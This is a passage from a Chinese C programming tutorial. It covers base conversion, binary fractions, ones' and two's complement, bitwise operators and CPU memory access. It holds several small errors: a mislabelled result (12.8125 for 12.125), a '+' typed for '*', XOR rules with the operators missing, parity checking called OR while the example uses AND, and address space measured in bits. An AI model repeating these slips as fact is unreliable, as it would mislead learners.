<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">从右至左每<span class="number">3</span>位划分为<span class="number">8</span>进制的<span class="number">1</span>位, 不够前面补<span class="number">0</span></span><br><span class="line"><span class="number">001</span> <span class="number">100</span> <span class="number">100</span></span><br><span class="line">第<span class="number">0</span>位: <span class="number">100</span> 等于十进制 <span class="number">4</span></span><br><span class="line">第<span class="number">1</span>位: <span class="number">100</span> 等于十进制 <span class="number">4</span></span><br><span class="line">第<span class="number">2</span>位: <span class="number">001</span> 等于十进制 <span class="number">1</span></span><br><span class="line">最终结果: <span class="number">144</span>就是转换为<span class="number">8</span>进制的值</span><br></pre></td></tr></table></figure>

<p>2 进制转 16 进制</p>
<ul>
<li>四个二进制位代表一个十六进制位，因为4个二进制位的最大值是15，而十六进制是逢16进1</li>
<li>例如: 将二进制01100100转换为十六进制数</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">从右至左每<span class="number">4</span>位划分为<span class="number">16</span>进制的<span class="number">1</span>位, 不够前面补<span class="number">0</span></span><br><span class="line"><span class="number">0110</span> <span class="number">0100</span></span><br><span class="line">第<span class="number">0</span>位: <span class="number">0100</span> 等于十进制 <span class="number">4</span></span><br><span class="line">第<span class="number">1</span>位: <span class="number">0110</span> 等于十进制 <span class="number">6</span></span><br><span class="line">最终结果: <span class="number">64</span>就是转换为<span class="number">16</span>进制的值</span><br></pre></td></tr></table></figure>

<p>其它进制转换为十进制</p>
<ul>
<li>系数 * 基数 ^ 索引 之和</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> 十进制           --&gt;          十进制</span><br><span class="line"><span class="number">12345</span>   =  <span class="number">10000</span> + <span class="number">2000</span> + <span class="number">300</span> + <span class="number">40</span> + <span class="number">5</span></span><br><span class="line">        =  (<span class="number">1</span> * <span class="number">10</span> ^ <span class="number">4</span>)  + (<span class="number">2</span> * <span class="number">10</span> ^ <span class="number">3</span>) + (<span class="number">3</span> * <span class="number">10</span> ^ <span class="number">2</span>) + (<span class="number">4</span> * <span class="number">10</span> ^ <span class="number">1</span>) + (<span class="number">5</span> * <span class="number">10</span> ^ <span class="number">0</span>)</span><br><span class="line">        =  (<span class="number">1</span> * <span class="number">10000</span>) + (<span class="number">2</span> + <span class="number">1000</span>) + (<span class="number">3</span> * <span class="number">100</span>) + (<span class="number">4</span> * <span class="number">10</span>) + (<span class="number">5</span> * <span class="number">1</span>)</span><br><span class="line">        =  <span class="number">10000</span> + <span class="number">2000</span> + <span class="number">300</span> + <span class="number">40</span> + <span class="number">5</span></span><br><span class="line">        =  <span class="number">12345</span></span><br><span class="line"></span><br><span class="line">规律:</span><br><span class="line">其它进制转换为十进制的结果 = 系数 * 基数 ^ 索引 之和</span><br><span class="line"></span><br><span class="line">系数: 每一位的值就是一个系数 </span><br><span class="line">基数: 从x进制转换到十进制, 那么x就是基数</span><br><span class="line">索引: 从最低位以<span class="number">0</span>开始, 递增的数</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">二进制        --&gt;      十进制</span><br><span class="line"><span class="number">543210</span></span><br><span class="line"><span class="number">101101</span> = (<span class="number">1</span> * <span class="number">2</span> ^ <span class="number">5</span>) + (<span class="number">0</span> * <span class="number">2</span> ^ <span class="number">4</span>) + (<span class="number">1</span> * <span class="number">2</span> ^ <span class="number">3</span>) + (<span class="number">1</span> * <span class="number">2</span> ^ <span class="number">2</span>) + (<span class="number">0</span> * <span class="number">2</span> ^ <span class="number">1</span>) + (<span class="number">1</span> * <span class="number">2</span> ^ <span class="number">0</span>)</span><br><span class="line">       = <span class="number">32</span> + <span class="number">0</span> + <span class="number">8</span> + <span class="number">4</span> + <span class="number">0</span> + <span class="number">1</span></span><br><span class="line">       = <span class="number">45</span></span><br><span class="line"></span><br><span class="line">八进制        --&gt;     十进制</span><br><span class="line"><span class="number">016</span>  =   (<span class="number">0</span> * <span class="number">8</span> ^ <span class="number">2</span>) + (<span class="number">1</span> * <span class="number">8</span> ^ <span class="number">1</span>) + (<span class="number">6</span> * <span class="number">8</span> ^ <span class="number">0</span>)</span><br><span class="line">     =    <span class="number">0</span>  + <span class="number">8</span> + <span class="number">6</span></span><br><span class="line">     =    <span class="number">14</span></span><br><span class="line"></span><br><span class="line">十六进制      --&gt;      十进制</span><br><span class="line"><span class="number">0x11f</span> =  (<span class="number">1</span> * <span class="number">16</span> ^ <span class="number">2</span>) + (<span class="number">1</span> * <span class="number">16</span> ^ <span class="number">1</span>) + (<span class="number">15</span> * <span class="number">16</span> ^ <span class="number">0</span>)</span><br><span class="line">      =   <span class="number">256</span>  + <span class="number">16</span> + <span class="number">15</span></span><br><span class="line">      =   <span class="number">287</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>十进制快速转换为其它进制</p>
<ul>
<li>十进制除以<code>基数</code>取余, 倒叙读取</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">十进制        --&gt;     二进制</span><br><span class="line"><span class="number">100</span>          --&gt;    <span class="number">1100100</span></span><br><span class="line"><span class="number">100</span> / <span class="number">2</span>   = <span class="number">50</span>     <span class="number">0</span></span><br><span class="line"><span class="number">50</span>  / <span class="number">2</span>   = <span class="number">25</span>     <span class="number">0</span></span><br><span class="line"><span class="number">25</span>  / <span class="number">2</span>   = <span class="number">12</span>     <span class="number">1</span></span><br><span class="line"><span class="number">12</span>  / <span class="number">2</span>   = <span class="number">6</span>      <span class="number">0</span></span><br><span class="line"><span class="number">6</span>   / <span class="number">2</span>   = <span class="number">3</span>      <span class="number">0</span></span><br><span class="line"><span class="number">3</span>   / <span class="number">2</span>   = <span class="number">1</span>      <span class="number">1</span></span><br><span class="line"><span class="number">1</span>   / <span class="number">2</span>   = <span class="number">0</span>      <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">十进制        --&gt;     八进制</span><br><span class="line"><span class="number">100</span>          --&gt;     <span class="number">144</span></span><br><span class="line"><span class="number">100</span> / <span class="number">8</span>    = <span class="number">12</span>    <span class="number">4</span></span><br><span class="line"><span class="number">12</span>  / <span class="number">8</span>    = <span class="number">1</span>     <span class="number">4</span></span><br><span class="line"><span class="number">1</span>   / <span class="number">8</span>    = <span class="number">0</span>     <span class="number">1</span></span><br><span class="line"></span><br><span class="line">十进制        --&gt;     十六进制</span><br><span class="line"><span class="number">100</span>          --&gt; <span class="number">64</span></span><br><span class="line"><span class="number">100</span> / <span class="number">16</span>   =  <span class="number">6</span>    <span class="number">4</span></span><br><span class="line"><span class="number">6</span>   / <span class="number">16</span>   =  <span class="number">0</span>    <span class="number">6</span></span><br></pre></td></tr></table></figure>

<h2 id="十进制小数转换为二进制小数"><a href="#十进制小数转换为二进制小数" class="headerlink" title="十进制小数转换为二进制小数"></a>十进制小数转换为二进制小数</h2><ul>
<li>整数部分,直接转换为二进制即可</li>
<li>小数部分,使用”乘2取整，顺序排列”<ul>
<li>用2乘十进制小数,可以得到积,将积的整数部分取出,再用2乘余下的小数部分,直到积中的小数部分为零，或者达到所要求的精度为止</li>
<li>然后把取出的整数部分按顺序排列起来, 即是小数部分二进制</li>
</ul>
</li>
<li>最后将整数部分的二进制和小数部分的二进制合并起来, 即是一个二进制小数</li>
<li>例如: 将12.125转换为二进制</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 整数部分(除2取余)</span></span><br><span class="line">  <span class="number">12</span></span><br><span class="line">/  <span class="number">2</span></span><br><span class="line">------</span><br><span class="line">   <span class="number">6</span>    <span class="comment">// 余0</span></span><br><span class="line">/  <span class="number">2</span></span><br><span class="line">------</span><br><span class="line">   <span class="number">3</span>    <span class="comment">// 余0</span></span><br><span class="line">/  <span class="number">2</span></span><br><span class="line">------</span><br><span class="line">   <span class="number">1</span>   <span class="comment">// 余1</span></span><br><span class="line">/  <span class="number">2</span></span><br><span class="line">------</span><br><span class="line">  <span class="number">0</span>   <span class="comment">// 余1</span></span><br><span class="line"><span class="comment">//12 --&gt; 1100</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// 小数部分(乘2取整数积)</span></span><br><span class="line">  <span class="number">0.125</span></span><br><span class="line">*     <span class="number">2</span></span><br><span class="line">  ------</span><br><span class="line">   <span class="number">0.25</span>  <span class="comment">//0</span></span><br><span class="line">   <span class="number">0.25</span></span><br><span class="line">*     <span class="number">2</span></span><br><span class="line">  ------</span><br><span class="line">    <span class="number">0.5</span>  <span class="comment">//0</span></span><br><span class="line">    <span class="number">0.5</span></span><br><span class="line">*     <span class="number">2</span></span><br><span class="line">  ------</span><br><span class="line">    <span class="number">1.0</span>  <span class="comment">//1</span></span><br><span class="line">    <span class="number">0.0</span></span><br><span class="line"><span class="comment">// 0.125 --&gt; 0.001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 12.8125 --&gt; 1100.001</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="二进制小数转换为十进制小数"><a href="#二进制小数转换为十进制小数" class="headerlink" title="二进制小数转换为十进制小数"></a>二进制小数转换为十进制小数</h2><ul>
<li>整数部分按照二进制转十进制即可</li>
<li>小数部分从最高位开始乘以2的负n次方, n从1开始</li>
<li>例如: 将 1100.001转换为十进制</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 整数部分(乘以2的n次方, n从0开始)</span></span><br><span class="line"><span class="number">0</span> * <span class="number">2</span>^<span class="number">0</span> = <span class="number">0</span></span><br><span class="line"><span class="number">0</span> * <span class="number">2</span>^<span class="number">1</span> = <span class="number">0</span></span><br><span class="line"><span class="number">1</span> * <span class="number">2</span>^<span class="number">2</span> = <span class="number">4</span></span><br><span class="line"><span class="number">1</span> * <span class="number">2</span>^<span class="number">3</span> = <span class="number">8</span></span><br><span class="line"> <span class="comment">// 1100 == 8 + 4 + 0 + 0 == 12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 小数部分(乘以2的负n次方, n从0开始)</span></span><br><span class="line"><span class="number">0</span> * (<span class="number">1</span>/<span class="number">2</span>) = <span class="number">0</span></span><br><span class="line"><span class="number">0</span> * (<span class="number">1</span>/<span class="number">4</span>) = <span class="number">0</span></span><br><span class="line"><span class="number">1</span> * (<span class="number">1</span>/<span class="number">8</span>) = <span class="number">0.125</span></span><br><span class="line"><span class="comment">// .100 == 0 + 0 + 0.125 == 0.125</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1100.001  --&gt; 12.125</span></span><br></pre></td></tr></table></figure>

<ul>
<li>练习:<ul>
<li>将0.8125转换为二进制</li>
<li>将0.1101转换为十进制</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="number">0.8125</span></span><br><span class="line">*      <span class="number">2</span></span><br><span class="line">--------</span><br><span class="line">   <span class="number">1.625</span>  <span class="comment">// 1</span></span><br><span class="line">   <span class="number">0.625</span></span><br><span class="line">*      <span class="number">2</span></span><br><span class="line">--------</span><br><span class="line">    <span class="number">1.25</span> <span class="comment">// 1</span></span><br><span class="line">    <span class="number">0.25</span></span><br><span class="line">*      <span class="number">2</span></span><br><span class="line">--------</span><br><span class="line">     <span class="number">0.5</span> <span class="comment">// 0</span></span><br><span class="line">*      <span class="number">2</span></span><br><span class="line">--------</span><br><span class="line">    <span class="number">1.0</span> <span class="comment">// 1</span></span><br><span class="line">    <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0. 8125  --&gt; 0.1101</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>*(<span class="number">1</span>/<span class="number">2</span>) = <span class="number">0.5</span></span><br><span class="line"><span class="number">1</span>*(<span class="number">1</span>/<span class="number">4</span>)=<span class="number">0.25</span></span><br><span class="line"><span class="number">0</span>*(<span class="number">1</span>/<span class="number">8</span>)=<span class="number">0</span></span><br><span class="line"><span class="number">1</span>*(<span class="number">1</span>/<span class="number">16</span>)=<span class="number">0.0625</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//0.1101 --&gt; 0.5 + 0.25 + 0 + 0.0625 == 0.8125</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="原码反码补码"><a href="#原码反码补码" class="headerlink" title="原码反码补码"></a>原码反码补码</h2><ul>
<li><p>计算机只能识别0和1, 所以计算机中存储的数据都是以0和1的形式存储的</p>
</li>
<li><p>数据在计算机内部是以补码的形式储存的, 所有数据的运算都是以补码进行的</p>
</li>
<li><p>正数的原码、反码和补码</p>
<ul>
<li>正数的原码、反码和补码都是它的二进制</li>
<li>例如: 12的原码、反码和补码分别为<ul>
<li><code>0000 0000 0000 0000 0000 0000 0000 1100</code></li>
<li><code>0000 0000 0000 0000 0000 0000 0000 1100</code></li>
<li><code>0000 0000 0000 0000 0000 0000 0000 1100</code></li>
</ul>
</li>
</ul>
</li>
<li><p>负数的原码、反码和补码</p>
<ul>
<li>二进制的最高位我们称之为符号位, 最高位是0代表是一个正数, 最高位是1代表是一个负数</li>
<li>一个负数的原码, 是将该负数的二进制最高位变为1</li>
<li>一个负数的反码, 是将该数的原码<code>除了符号位</code>以外的其它位取反</li>
<li>一个负数的补码, 就是它的反码 + 1</li>
<li>例如: -12的原码、反码和补码分别为</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1100</span> <span class="comment">// 12二进制</span></span><br><span class="line"><span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1100</span> <span class="comment">// -12原码</span></span><br><span class="line"><span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">0011</span>  <span class="comment">// -12反码</span></span><br><span class="line"><span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">0100</span> <span class="comment">// -12补码</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>负数的原码、反码和补码逆向转换</p>
<ul>
<li>反码 = 补码-1</li>
<li>原码= 反码最高位不变, 其它位取反</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">0100</span> <span class="comment">// -12补码</span></span><br><span class="line"><span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">0011</span>  <span class="comment">// -12反码</span></span><br><span class="line"><span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1100</span> <span class="comment">// -12原码</span></span><br></pre></td></tr></table></figure>

<p>为什么要引入反码和补码</p>
<ul>
<li><p>在学习本节内容之前,大家必须明白一个东西, 就是计算机只能做加法运算, 不能做减法和乘除法, 所以的减法和乘除法内部都是用加法来实现的</p>
<ul>
<li>例如: 1 - 1, 内部其实就是 1 + (-1);</li>
<li>例如: 3 * 3, 内部其实就是 3 + 3 + 3;</li>
<li>例如: 9 / 3, 内部其实就是 9 + (-3) + (-3) + (-3);</li>
</ul>
</li>
<li><p>首先我们先来观察一下,如果只有原码会存储什么问题</p>
<ul>
<li>很明显, 通过我们的观察, 如果只有原码, 1-1的结果不对</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1 + 1</span></span><br><span class="line"> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0001</span> <span class="comment">// 1原码</span></span><br><span class="line">+<span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0001</span> <span class="comment">// 1原码</span></span><br><span class="line"> ---------------------------------------</span><br><span class="line"> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0010</span>  == <span class="number">2</span></span><br><span class="line">  </span><br><span class="line"> <span class="comment">// 1 - 1; 1 + (-1);</span></span><br><span class="line"> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0001</span> <span class="comment">// 1原码</span></span><br><span class="line">+<span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0001</span> <span class="comment">// -1原码</span></span><br><span class="line"> ---------------------------------------</span><br><span class="line"> <span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0010</span> == <span class="number">-2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>正是因为对于减法来说,如果使用原码结果是不正确的, 所以才引入了反码</p>
<ul>
<li>通过反码计算减法的结果, 得到的也是一个反码;</li>
<li>将计算的结果符号位不变其余位取反,就得到了计算结果的原码</li>
<li>通过对原码的转换, 很明显我们计算的结果是-0, 符合我们的预期</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1 - 1; 1 + (-1);</span></span><br><span class="line"><span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0001</span> <span class="comment">// 1反码</span></span><br><span class="line"><span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1110</span>   <span class="comment">// -1反码</span></span><br><span class="line">---------------------------------------</span><br><span class="line"><span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="comment">// 计算结果反码</span></span><br><span class="line"><span class="number">1000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="comment">// 计算结果原码 == -0</span></span><br></pre></td></tr></table></figure>

<p>虽然反码能够满足我们的需求, 但是对于0来说, 前面的负号没有任何意义, 所以才引入了补码</p>
<ul>
<li>由于int只能存储4个字节, 也就是32位数据, 而计算的结果又33位, 所以最高位溢出了,符号位变成了0, 所以最终得到的结果是0</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// 1 - 1; 1 + (-1);</span></span><br><span class="line"> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0001</span> <span class="comment">// 1补码</span></span><br><span class="line"> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span> <span class="number">1111</span>   <span class="comment">// -1补码</span></span><br><span class="line"> ---------------------------------------</span><br><span class="line"><span class="number">10000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="comment">// 计算结果补码</span></span><br><span class="line"> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="comment">//  == 0</span></span><br></pre></td></tr></table></figure>

<h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><ul>
<li>程序中的所有数据在计算机内存中都是以二进制的形式储存的。</li>
<li>位运算就是直接对整数在内存中的二进制位进行操作</li>
<li>C语言提供了6个位操作运算符, 这些运算符只能用于整型操作数</li>
</ul>
<table>
<thead>
<tr>
<th align="center">符号</th>
<th align="center">名称</th>
<th align="center">运算结果</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&amp;</td>
<td align="center">按位与</td>
<td align="center">同1为1</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center">按位或</td>
<td align="center">有1为1</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">按位异或</td>
<td align="center">不同为1</td>
</tr>
<tr>
<td align="center">~</td>
<td align="center">按位取反</td>
<td align="center">0变1,1变0</td>
</tr>
<tr>
<td align="center">&lt;&lt;</td>
<td align="center">按位左移</td>
<td align="center">乘以2的n次方</td>
</tr>
<tr>
<td align="center">&gt;&gt;</td>
<td align="center">按位右移</td>
<td align="center">除以2的n次方</td>
</tr>
</tbody></table>
<ul>
<li>按位与:<ul>
<li>只有对应的两个二进位均为1时，结果位才为1，否则为0</li>
<li>规律: 二进制中，与1相&amp;就保持原位，与0相&amp;就为0</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9&amp;5 = 1</span><br><span class="line"></span><br><span class="line"> 1001</span><br><span class="line">&amp;0101</span><br><span class="line">------</span><br><span class="line"> 0001</span><br></pre></td></tr></table></figure>

<ul>
<li>按位或:<ul>
<li>只要对应的二个二进位有一个为1时，结果位就为1，否则为0</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9|5 = 13</span><br><span class="line"></span><br><span class="line"> 1001</span><br><span class="line">|0101</span><br><span class="line">------</span><br><span class="line"> 1101</span><br></pre></td></tr></table></figure>

<ul>
<li>按位异或<ul>
<li>当对应的二进位相异（不相同）时，结果为1，否则为0</li>
<li>规律:<ul>
<li>相同整数相的结果是0。比如55=0</li>
<li>多个整数相^的结果跟顺序无关。例如: 567=576</li>
<li>同一个数异或另外一个数两次, 结果还是那个数。例如: 577 = 5</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9^5 = 12</span><br><span class="line"></span><br><span class="line"> 1001</span><br><span class="line">^0101</span><br><span class="line">------</span><br><span class="line"> 1100</span><br></pre></td></tr></table></figure>

<ul>
<li>按位取反<ul>
<li>各二进位进行取反（0变1，1变0）</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~9 =-10</span><br><span class="line">0000 0000 0000 0000 0000 1001 // 取反前</span><br><span class="line">1111 1111 1111 1111 1111 0110 // 取反后</span><br><span class="line"></span><br><span class="line">// 根据负数补码得出结果</span><br><span class="line">1111 1111 1111 1111 1111 0110 // 补码</span><br><span class="line">1111 1111 1111 1111 1111 0101 // 反码</span><br><span class="line">1000 0000 0000 0000 0000 1010 // 源码 == -10</span><br></pre></td></tr></table></figure>

<p>位运算应用场景:</p>
<ul>
<li>判断奇偶(按位或)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 偶数: 的二进制是以0结尾</span><br><span class="line"> 8   -&gt; 1000</span><br><span class="line"> 10  -&gt; 1010</span><br><span class="line"> </span><br><span class="line"> 奇数: 的二进制是以1结尾</span><br><span class="line"> 9   -&gt; 1001</span><br><span class="line"> 11  -&gt; 1011</span><br><span class="line"></span><br><span class="line"> 任何数和1进行&amp;操作,得到这个数的最低位</span><br><span class="line"> 1000</span><br><span class="line">&amp;0001</span><br><span class="line"> -----</span><br><span class="line"> 0000  // 结果为0, 代表是偶数</span><br><span class="line"></span><br><span class="line"> 1011</span><br><span class="line">&amp;0001</span><br><span class="line"> -----</span><br><span class="line"> 0001 // 结果为1, 代表是奇数</span><br></pre></td></tr></table></figure>

<ul>
<li>权限系统</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  enum Unix &#123;</span><br><span class="line">    S_IRUSR = 256,// 100000000 用户可读</span><br><span class="line">    S_IWUSR = 128,//  10000000 用户可写</span><br><span class="line">    S_IXUSR = 64,//    1000000 用户可执行</span><br><span class="line">    S_IRGRP = 32,//     100000 组可读</span><br><span class="line">    S_IWGRP = 16,//      10000 组可写</span><br><span class="line">    S_IXGRP = 8,//        1000 组可执行</span><br><span class="line">    S_IROTH = 4,//         100 其它可读</span><br><span class="line">    S_IWOTH = 2,//          10 其它可写</span><br><span class="line">    S_IXOTH = 1 //           1 其它可执行</span><br><span class="line">   &#125;;</span><br><span class="line">// 假设设置用户权限为可读可写</span><br><span class="line">printf(&quot;%d\n&quot;, S_IRUSR | S_IWUSR); // 384 // 110000000</span><br></pre></td></tr></table></figure>

<ul>
<li>交换两个数的值(按位异或)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = a^b;</span><br><span class="line">b = b^a;</span><br><span class="line">a = a^b;</span><br></pre></td></tr></table></figure>

<ul>
<li>按位左移<ul>
<li>把整数a的各二进位全部左移n位，高位丢弃，低位补0<ul>
<li>由于左移是丢弃最高位，0补最低位，所以符号位也会被丢弃，左移出来的结果值可能会改变正负性</li>
</ul>
</li>
<li>规律: 左移n位其实就是乘以2的n次方</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2&lt;&lt;1; //相当于 2 *= 2 // 4</span><br><span class="line">  0010</span><br><span class="line">&lt;&lt;0100</span><br><span class="line"></span><br><span class="line">2&lt;&lt;2; //相当于 2 *= 2^2; // 8</span><br><span class="line">  0010</span><br><span class="line">&lt;&lt;1000</span><br></pre></td></tr></table></figure>

<ul>
<li>按位右移<ul>
<li>把整数a的各二进位全部右移n位，保持符号位不变<ul>
<li>为正数时， 符号位为0，最高位补0</li>
<li>为负数时，符号位为1，最高位是补0或是补1(取决于编译系统的规定)</li>
</ul>
</li>
<li>规律: 快速计算一个数除以2的n次方</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2&gt;&gt;1; //相当于 2 /= 2 // 1</span><br><span class="line">  0010</span><br><span class="line">&gt;&gt;0001</span><br><span class="line">4&gt;&gt;2; //相当于 4 /= 2^2 // 1</span><br><span class="line">  0100</span><br><span class="line">&gt;&gt;0001</span><br></pre></td></tr></table></figure>

<ul>
<li>练习:<ul>
<li>写一个函数把一个10进制数按照二进制格式输出</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void printBinary(int num);</span><br><span class="line">int main(int argc, const char * argv[]) &#123;</span><br><span class="line">    printBinary(13);</span><br><span class="line">&#125;</span><br><span class="line">void printBinary(int num)&#123;</span><br><span class="line">    int len = sizeof(int)*8;</span><br><span class="line">    int temp;</span><br><span class="line">    for (int i=0; i&lt;len; i++) &#123;</span><br><span class="line">        temp = num; //每次都在原数的基础上进行移位运算</span><br><span class="line">        temp = temp&gt;&gt;(31-i); //每次移动的位数</span><br><span class="line">        int t = temp&amp;1; //取出最后一位</span><br><span class="line">        if(i!=0&amp;&amp;i%4==0)printf(&quot; &quot;); printf(&quot;%d&quot;,t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="变量内存分析"><a href="#变量内存分析" class="headerlink" title="变量内存分析"></a>变量内存分析</h2><ul>
<li>内存模型<ul>
<li>内存模型是线性的(有序的)</li>
<li>对于 32 机而言，最大的内存地址是2^32次方bit(4294967296)(4GB)</li>
<li>对于 64 机而言，最大的内存地址是2^64次方bit(18446744073709552000)(171亿GB)</li>
</ul>
</li>
</ul>
<p><img src="/2022/01/15/C/c15e330e2723191671e55b27cd9e4f1c.png" alt="img"></p>
<ul>
<li>CPU 读写内存<ul>
<li>CPU 在运作时要明确三件事<ul>
<li>存储单元的地址（地址信息）</li>
<li>器件的选择，读 or 写 （控制信息）</li>
<li>读写的数据 （数据信息）</li>
</ul>
</li>
</ul>
</li>
<li>如何明确这三件事情<ul>
<li>通过地址总线找到存储单元的地址</li>
<li>通过控制总线发送内存读写指令</li>
<li>通过数据总线传输需要读写的数据</li>
</ul>
</li>
</ul>
<blockquote>
<ul>
<li><code>地址总线: 地址总线宽度决定了CPU可以访问的物理地址空间(寻址能力)</code><ul>
<li><code>例如: 地址总线的宽度是1位, 那么表示可以访问 0 和 1的内存</code></li>
<li><code>例如: 地址总线的位数是2位, 那么表示可以访问 00、01、10、11的内存</code></li>
</ul>
</li>
<li><code>数据总线: 数据总线的位数决定CPU单次通信能交换的信息数量</code><ul>
<li><code>例如: 数据总线:的宽度是1位, 那么一次可以传输1位二进制数据</code></li>
<li><code>例如: 地址总线的位数是2位,那么一次可以传输2位二进制数据</code></li>
</ul>
</li>
<li><code>控制总线: 用来传送各种控制信号</code></li>
</ul>
</blockquote>
<p>写入流程</p>
<ul>
<li>CPU 通过地址线将找到地址为 FFFFFFFB 的内存</li>
<li>CPU 通过控制线发出内存写入命令，选中存储器芯片，并通知它，要其写入数据。</li>
<li>CPU 通过数据线将数据 8 送入内存 FFFFFFFB 单元中</li>
</ul>
<p><img src="/2022/01/15/C/ed76e9a4a2ce06d0a3cd20192956f863.png" alt="img"></p>
<p>读取流程</p>
<ul>
<li>CPU 通过地址线将找到地址为 FFFFFFFB 的内存</li>
